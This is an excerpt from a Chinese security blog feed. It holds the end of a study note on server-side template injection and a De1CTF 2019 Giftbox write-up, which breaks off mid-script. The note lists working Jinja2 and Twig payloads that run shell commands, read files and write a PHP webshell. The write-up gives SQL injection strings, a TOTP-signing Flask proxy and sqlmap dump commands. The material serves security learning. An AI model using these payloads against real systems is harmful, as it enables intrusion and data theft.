class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("id").read()'</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># exec webshell2</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("id").read()'</span>) &#125;&#125; </span><br><span class="line">    <span class="comment"># poppen的参数就是要执行的命令</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取基本类</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">object</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r'C:\1.php'</span>).read()</span><br><span class="line">object.__subclasses__()[<span class="number">40</span>](<span class="string">r'C:\1.php'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/input'</span>, <span class="string">'w'</span>).write(<span class="string">'123'</span>)</span><br><span class="line">object.__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/input'</span>, <span class="string">'w'</span>).write(<span class="string">'123'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行任意命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls  /var/www/html").read()'</span> )</span><br><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls  /var/www/html").read()'</span> )</span><br></pre></td></tr></table></figure></div><h2 id="TWIG-全版本-通用-SSTI-payload"><a href="#TWIG-全版本-通用-SSTI-payload" class="headerlink" title="TWIG 全版本 通用 SSTI payload"></a>TWIG 全版本 通用 SSTI payload</h2><p><a href="https://xz.aliyun.com/t/7518" target="_blank" rel="noopener">参考文档</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">"id"</span>]|map(<span class="string">"system"</span>)|join(<span class="string">","</span>)</span><br><span class="line">&#123;&#123;[<span class="string">"id"</span>, <span class="number">0</span>]|sort(<span class="string">"system"</span>)|join(<span class="string">","</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">"id"</span>]|filter(<span class="string">"system"</span>)|join(<span class="string">","</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">"system"</span>, <span class="string">"id"</span>)|join(<span class="string">","</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;<span class="string">"&lt;?php phpinfo();"</span>:<span class="string">"/var/www/html/shell.php"</span>&#125;|map(<span class="string">"file_put_contents"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></div><h2 id="需要了解的一些东西"><a href="#需要了解的一些东西" class="headerlink" title="需要了解的一些东西"></a>需要了解的一些东西</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 字符串</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__</span><br><span class="line">&lt;type <span class="string">'str'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__</span><br><span class="line"></span><br><span class="line"><span class="comment"># 元组</span></span><br><span class="line">&lt;type <span class="string">'tuple'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表</span></span><br><span class="line">&lt;type <span class="string">'list'</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字典</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__</span><br><span class="line">&lt;type <span class="string">'dict'</span>&gt;</span><br></pre></td></tr></table></figure></div><p><strong>_<em>class_</em></strong> ：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__</span><br><span class="line">(&lt;type <span class="string">'object'</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__bases__</span><br><span class="line">(&lt;type <span class="string">'basestring'</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__bases__</span><br><span class="line">(&lt;type <span class="string">'object'</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__.__bases__</span><br><span class="line">(&lt;type <span class="string">'object'</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br></pre></td></tr></table></figure></div><p><strong>_<em>bases_</em></strong> ：用来查看类的基类，也可是使用数组索引来查看特定位置的值</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">[&lt;type <span class="string">'type'</span>&gt;, &lt;type <span class="string">'weakref'</span>&gt;, &lt;type <span class="string">'weakcallableproxy'</span>&gt;, &lt;type <span class="string">'weakproxy'</span>&gt;,</span><br><span class="line"> &lt;type <span class="string">'int'</span>&gt;, &lt;type <span class="string">'basestring'</span>&gt;, &lt;type <span class="string">'bytearray'</span>&gt;, &lt;type <span class="string">'list'</span>&gt;, &lt;type <span class="string">'NoneType'</span>&gt;, </span><br><span class="line"> &lt;type <span class="string">'NotImplementedType'</span>&gt;, &lt;type <span class="string">'traceback'</span>&gt;, &lt;type <span class="string">'super'</span>&gt;, &lt;type <span class="string">'xrange'</span>&gt;, </span><br><span class="line"> &lt;type <span class="string">'dict'</span>&gt;, &lt;type <span class="string">'set'</span>&gt;, &lt;type <span class="string">'slice'</span>&gt;, &lt;type <span class="string">'staticmethod'</span>&gt;, &lt;type <span class="string">'complex'</span>&gt;, </span><br><span class="line"> &lt;type <span class="string">'float'</span>&gt;, &lt;type <span class="string">'buffer'</span>&gt;, &lt;type <span class="string">'long'</span>&gt;, &lt;type <span class="string">'frozenset'</span>&gt;, &lt;type <span class="string">'property'</span>&gt;, </span><br><span class="line"> &lt;type <span class="string">'memoryview'</span>&gt;, &lt;type <span class="string">'tuple'</span>&gt;, &lt;type <span class="string">'enumerate'</span>&gt;, &lt;type <span class="string">'reversed'</span>&gt;, &lt;type <span class="string">'code'</span>&gt;, </span><br><span class="line"> &lt;type <span class="string">'frame'</span>&gt;, &lt;type <span class="string">'builtin_function_or_method'</span>&gt;, &lt;type <span class="string">'instancemethod'</span>&gt;,</span><br><span class="line">  &lt;type <span class="string">'function'</span>&gt;, &lt;type <span class="string">'classobj'</span>&gt;, &lt;type <span class="string">'dictproxy'</span>&gt;, &lt;type <span class="string">'generator'</span>&gt;,</span><br><span class="line">    &lt;type <span class="string">'getset_descriptor'</span>&gt;, &lt;type <span class="string">'wrapper_descriptor'</span>&gt;, &lt;type <span class="string">'instance'</span>&gt;, &lt;type <span class="string">'ellipsis'</span>&gt;,</span><br><span class="line">    &lt;type <span class="string">'member_descriptor'</span>&gt;, &lt;type <span class="string">'file'</span>&gt;, &lt;type <span class="string">'PyCapsule'</span>&gt;, &lt;type <span class="string">'cell'</span>&gt;, </span><br><span class="line">    &lt;type 'callable-iterator'&gt;, &lt;type 'iterator'&gt;, &lt;type 'sys.long_info'&gt;, &lt;type 'sys.float_info'&gt;, &lt;type 'EncodingMap'&gt;, &lt;type 'fieldnameiterator'&gt;, &lt;type 'formatteriterator'&gt;, &lt;type 'sys.version_info'&gt;, &lt;type 'sys.flags'&gt;, &lt;type 'sys.getwindowsversion'&gt;, &lt;type 'exceptions.BaseException'&gt;, &lt;type 'module'&gt;, &lt;type 'imp.NullImporter'&gt;, &lt;type 'zipimport.zipimporter'&gt;, &lt;type 'nt.stat_result'&gt;, &lt;type 'nt.statvfs_result'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class '_abcoll.Hashable'&gt;, &lt;type 'classmethod'&gt;, &lt;class '_abcoll.Iterable'&gt;, &lt;class '_abcoll.Sized'&gt;, &lt;class '_abcoll.Container'&gt;, &lt;class '_abcoll.Callable'&gt;, &lt;type 'dict_keys'&gt;, &lt;type 'dict_items'&gt;, &lt;type 'dict_values'&gt;, &lt;class 'site._Printer'&gt;, &lt;class 'site._Helper'&gt;, &lt;type '_sre.SRE_Pattern'&gt;, &lt;type '_sre.SRE_Match'&gt;, &lt;type '_sre.SRE_Scanner'&gt;, &lt;class 'site.Quitter'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;type 'operator.itemgetter'&gt;, &lt;type 'operator.attrgetter'&gt;, &lt;type 'operator.methodcaller'&gt;, &lt;type 'functools.partial'&gt;, &lt;type 'MultibyteCodec'&gt;, &lt;type 'MultibyteIncrementalEncoder'&gt;, &lt;type 'MultibyteIncrementalDecoder'&gt;, &lt;type 'MultibyteStreamReader'&gt;, &lt;type 'MultibyteStreamWriter'&gt;]</span><br></pre></td></tr></table></figure></div><p><strong>_<em>subclasses_</em>()</strong> ：查看当前类的子类。</p><p>当然我们也可以直接用 <strong>object._<em>subclasses_</em>()</strong>，会得到和上面一样的结果。<br>获取基类还能用还有 <strong>_<em>mro_</em></strong>，比如：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__</span><br><span class="line">(&lt;class 'str'&gt;, &lt;class 'object'&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__mro__</span><br><span class="line">(&lt;class 'list'&gt;, &lt;class 'object'&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__.__mro__</span><br><span class="line">(&lt;class 'dict'&gt;, &lt;class 'object'&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__mro__</span><br><span class="line">(&lt;class 'tuple'&gt;, &lt;class 'object'&gt;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用索引获取基类</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">object</span>'&gt;</span></span><br></pre></td></tr></table></figure></div><h1 id="力推参考学习"><a href="#力推参考学习" class="headerlink" title="力推参考学习"></a>力推参考学习</h1><p><a href="https://blog.csdn.net/qq_43390703/article/details/104256001" target="_blank" rel="noopener">python沙箱逃逸</a></p><p><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">SSTi神器–Tplmap</a></p><p><a href="https://blog.csdn.net/weixin_43536759/article/details/105066445" target="_blank" rel="noopener">SSTI注入语句总结</a></p><p><a href="https://blog.csdn.net/wy_97/article/details/80393854" target="_blank" rel="noopener">python沙箱逃逸一些套路的小结</a></p><p><a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">一文看懂Python沙箱逃逸</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="瞎扯" scheme="https://manayakko.github.io/yakko117/tags/%E7%9E%8E%E6%89%AF/"/>
    
      <category term="渗透" scheme="https://manayakko.github.io/yakko117/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>De1CTF Giftbox题解</title>
    <link href="https://manayakko.github.io/yakko117/2020/04/02/De1CTFGiftbox/"/>
    <id>https://manayakko.github.io/yakko117/2020/04/02/De1CTFGiftbox/</id>
    <published>2020-04-02T10:50:48.019Z</published>
    <updated>2020-04-05T04:21:03.814Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>一道可以学习到很多的题目，还是自己太菜了，要看大佬的wp才能完全了解透彻</p><h1 id="De1CTF-2019-Giftbox"><a href="#De1CTF-2019-Giftbox" class="headerlink" title="[De1CTF 2019]Giftbox"></a>[De1CTF 2019]Giftbox</h1><p>题目打开，只能感慨大师傅还是大师傅，题目前端做成这个效果，太顶了</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_1.png" data-fancybox="group" data-caption="gift1" class="fancybox"><img alt="gift1" title="gift1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_1.png" class="lazyload"></a></p><p>看样子是个 <code>linux终端</code>, 然后看一下有哪些命令可以调用</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_2.png" data-fancybox="group" data-caption="gift2" class="fancybox"><img alt="gift2" title="gift2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_2.png" class="lazyload"></a></p><p>试一下相应的命令，看一下效果</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_3.png" data-fancybox="group" data-caption="gift3" class="fancybox"><img alt="gift3" title="gift3" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_3.png" class="lazyload"></a></p><p>看到了 <code>usage.md</code> 有新的 <code>hint</code>，尝试一下</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_4.png" data-fancybox="group" data-caption="gift4" class="fancybox"><img alt="gift4" title="gift4" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_4.png" class="lazyload"></a></p><p>可以看到，都需要先登陆，那就尝试一下 <code>sql注入</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[de1ta@de1ta-mbp /sandbox]% login admin'and<span class="comment">/**/</span>'1'='1 admin</span><br><span class="line">login fail, password incorrect.</span><br><span class="line">[de1ta@de1ta-mbp /sandbox]% login admin'and<span class="comment">/**/</span>'1'='0 admin</span><br><span class="line">login fail, user not found.</span><br></pre></td></tr></table></figure></div><p>查看数据包，看到有个 <strong><code>totp</code></strong>，再次提交之后这个 <strong><code>totp</code></strong> 又会发生改变</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_5.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" title="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_5.png" class="lazyload"></a></p><hr><h2 id="查了一下-TOTP"><a href="#查了一下-TOTP" class="headerlink" title="查了一下 TOTP"></a>查了一下 TOTP</h2><p><a href="https://baike.baidu.com/item/TOTP%E7%AE%97%E6%B3%95/22810708?fr=aladdin" target="_blank" rel="noopener">TOTP算法</a> (<code>Time-based One-time Password algorithm</code>)是一种从共享密钥和当前时间计算一次性密码的算法。</p><p><strong><font color="6495ED">一些要求</font></strong>：</p><ul><li>令牌与服务器之间必须时钟同步；</li><li>令牌与服务器之间必须共享密钥；</li><li>令牌与服务器之间必须使用相同的时间步长</li></ul><p><strong><font color="6495ED">核心算法</font></strong>：<br><strong><font color="6495ED">TOTP =Truncate(HMAC-SHA-1(K, (T - T0) / X))</font></strong><br><strong><font color="6495ED">X</font></strong> 是时间间隔</p><hr><p>然后在 <code>main.js</code> 找到了密钥</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_6.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" title="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_6.png" class="lazyload"></a></p><p>在这上面的注释里也给出了提示</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Javascript</div></div><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Developer Notes]</span><br><span class="line">OTP Library <span class="keyword">for</span> Python located <span class="keyword">in</span> js/pyotp.zip</span><br><span class="line">Server Params:</span><br><span class="line">digits = <span class="number">8</span></span><br><span class="line">interval = <span class="number">5</span></span><br><span class="line"><span class="built_in">window</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure></div><p>然后跟进去看 <code>totp.min.js</code> 可以看到最后有新的 <code>hint</code> (虽然作用不大233</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Javascript</div></div><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Two-factor authentication implementation <span class="keyword">in</span> pure javascript.</span><br><span class="line">One-time password generator (HOTP/TOTP) <span class="keyword">with</span> support <span class="keyword">for</span> Google Authenticator.</span><br><span class="line">@author   wuyanxin &lt;https:<span class="comment">//wuyanxin.com&gt;</span></span><br><span class="line">@license  MIT</span><br></pre></td></tr></table></figure></div><p>然后在gay吧找到了 <a href="https://github.com/wuyanxin/totp.js" target="_blank" rel="noopener">https://github.com/wuyanxin/totp.js</a><br>(算法还是挺好理解的)</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_7.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" title="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_7.png" class="lazyload"></a></p><p>可以看到缺省值就是5</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_8.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" title="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_8.png" class="lazyload"></a></p><p>然后看了大佬的写法</p><hr><h2 id="获取-sql-密码"><a href="#获取-sql-密码" class="headerlink" title="获取 sql 密码"></a>获取 sql 密码</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>用 <code>flask</code> 搭建一个本地服务并接受参数传到靶机，然后用 <code>sqlmap</code> 去跑本地靶机</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app=Flask(__name__)</span><br><span class="line">totp=pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>,digits=<span class="number">8</span>,interval=<span class="number">5</span>)</span><br><span class="line">s=requests.session()</span><br><span class="line">fuzz=string.printable</span><br><span class="line"><span class="meta">@app.route('/username=&lt;username&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span><span class="params">(username)</span>:</span></span><br><span class="line">    url=<span class="string">'http://link-site/shell.php'</span></span><br><span class="line">    username=(username).replace(<span class="string">' '</span>,<span class="string">'/**/'</span>)</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">'a'</span>:<span class="string">'login &#123;&#125; admin'</span>.format(username),</span><br><span class="line">        <span class="string">'totp'</span>:totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    res = s.get(url,params=params)</span><br><span class="line">    <span class="keyword">return</span> res.content</span><br><span class="line">app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></div><p>启动之后 用 <code>sqlmap</code> 去跑</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://127.0.0.1:5000/username=admin*"</span> -D giftbox -T users -C password --dump  --technique B</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:5000/username=admin*"</span></span><br></pre></td></tr></table></figure></div><p>得到密码: <strong><font color="6495ED">hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</font></strong></p><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>来自<a href="https://www.zhaoj.in/read-6170.html" target="_blank" rel="noopener">赵师傅</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># --- coding: utf-8 ---</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyotp <span class="keyword">as</span> pyotp</span><br><span class="line"></span><br><span class="line">totp = pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    get_all_databases()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">http_get</span><span class="params">(payload)</span>:</span></span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = requests.post(<span class="string">'http://link-site/shell.php'</span>, params=&#123;<span class="string">'a'</span>: <span class="string">'login admin\'/**/and/**/('</span> + payload + <span class="string">')/**/and/**/\'1\'=\'1 admin'</span>, <span class="string">'totp'</span>: totp.now()&#125;,data=&#123;<span class="string">'dir'</span>: <span class="string">'/'</span>, <span class="string">'pos'</span>: <span class="string">'/'</span>, <span class="string">'filename'</span>: <span class="string">'usage.md'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'login admin\'/**/and/**/('</span> + payload + <span class="string">')/**/and/**/\'1\'=\'1 admin'</span>)</span><br><span class="line">    print(r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_databases</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># db_nums_payload = 